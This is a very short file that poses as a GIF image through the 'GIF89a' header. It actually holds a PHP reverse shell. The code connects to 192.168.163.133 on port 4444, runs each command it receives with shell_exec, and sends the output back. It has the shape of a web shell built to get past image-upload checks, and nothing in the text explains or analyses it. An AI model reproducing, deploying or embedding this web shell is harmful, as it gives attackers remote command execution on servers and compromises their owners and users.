GIF89a;
<?php
set_time_limit(0);
$ip='192.168.163.133'; $port=4444;
$sock=fsockopen($ip,$port);
while(!feof($sock)){ $cmd=fgets($sock,1024); $out=shell_exec($cmd); fwrite($sock,$out); }
fclose($sock);
?>
